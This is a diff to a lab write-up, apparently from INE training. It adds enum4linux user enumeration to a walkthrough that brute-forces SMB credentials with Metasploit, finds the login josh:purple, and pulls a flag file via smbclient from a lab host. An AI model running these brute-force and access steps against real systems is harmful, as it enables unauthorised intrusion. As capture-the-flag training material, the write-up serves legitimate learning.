@@ -13,21 +13,34 @@ Assessment Methodologies – Enumeration
 
 ## Objective
 
-Use Metasploit to brute force SMB credentials using user and password wordlists. Once valid credentials are found, access the SMB share and retrieve the flag.
+Use enumeration and brute-force attacks to obtain SMB credentials. Then, access the authenticated share to extract a hidden flag.
 
 ---
 
 ## Tools Used
 
-- Metasploit (`msfconsole`)
-- Wordlists (`users.txt` and `unix_passwords.txt`)
-- `smbclient` to access shares after cracking
+- `enum4linux` – for user enumeration
+- `Metasploit` – for brute force with SMB login module
+- `smbclient` – for accessing SMB shares
 
 ---
 
 ## Step-by-Step Walkthrough
 
-### 🔹 Step 1: Launch Metasploit and Load SMB Login Module
+### 🔹 Step 1: Enumerate Users with `enum4linux`
+
+We start by using `enum4linux` to enumerate valid users on the SMB service.
+
+```bash
+enum4linux -a target.ine.local
+```
+The tool successfully identified local users:
+- `josh`
+- `bob`
+- `nancy`
+- `alice`
+
+### 🔹 Step : Launch Metasploit and Load SMB Login Module
 
 ```bash
 msfconsole -q
@@ -36,7 +49,7 @@ set RHOSTS target.ine.local
 ```
 ![Step 1](./1.png)
 
-### 🔹 Step 2: Create a User Wordlist
+### 🔹 Step 3: Create a User Wordlist
 
 Created `users.txt` with common usernames:
 ```bash
@@ -47,7 +60,7 @@ alice
 ```
 ![Step 2](./2.png)
 
-### 🔹 Step 3: Set Wordlists in Metasploit
+### 🔹 Step 4: Set Wordlists in Metasploit
 ```bash
 set USER_FILE users.txt
 set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
@@ -55,13 +68,13 @@ run
 ```
 ![Step 3](./3.png)
 
-### 🔹 Step 4: Valid Credentials Found
+### 🔹 Step 5: Valid Credentials Found
 ```yaml
 josh : purple
 ```
 ![Step 4](./4.png)
 
-### 🔹 Step 5: Access SMB Share Using `smbclient`
+### 🔹 Step 6: Access SMB Share Using `smbclient`
 ```bash
 smbclient //target.ine.local/josh -U josh
 ```
@@ -72,7 +85,7 @@ get flag2.txt
 ```
 ![Step 5](./5.png)
 
-### 🔹 Step 6: View the Retrieved Flag
+### 🔹 Step 7: View the Retrieved Flag
 ```bash
 cat flag2.txt
 ```
